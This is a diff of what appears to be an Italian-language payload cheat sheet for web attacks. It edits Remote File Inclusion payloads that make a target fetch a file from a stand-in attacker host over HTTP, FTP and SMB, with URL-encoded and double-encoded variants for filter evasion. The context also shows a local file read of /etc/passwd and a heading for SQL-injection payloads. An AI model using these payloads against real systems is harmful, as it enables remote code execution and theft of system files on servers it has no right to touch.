@@ -61,21 +61,21 @@ file://etc/passwd
 
 
 ==>  RFI
-http://<ATTACKER-IP>/shell.php
+http://<ATTACKER-IP>/rfi.txt
 == UTF-8 encoding
-http:%2f/%2FATTACKER_IP>%2fshell.php
+http:%2f/%2FATTACKER_IP>%2frfi.txt
 == Double encoding
-http:%252f%252f<ATTACKER-IP>%252fshell.php
+http:%252f%252f<ATTACKER-IP>%252frfi.txt
 
 == Attivazione RFI via FTP
-ftp://<ATTACKER-IP>/shell.php
+ftp://<ATTACKER-IP>/rfi.txt
 == UTF-8 encoding
-ftp:%2f/%2FATTACKER_IP>%2fshell.php
+ftp:%2f/%2FATTACKER_IP>%2frfi.txt
 == Double encoding
-ftp:%252f%252f<ATTACKER-IP>%252fshell.php
+ftp:%252f%252f<ATTACKER-IP>%252frfi.txt
 
 == Attivazione RFI via SMB
-\\<ATTACKER-IP>\shell.php
+\\<ATTACKER-IP>\rfi.txt
 
 
 ==> SQL-injection:
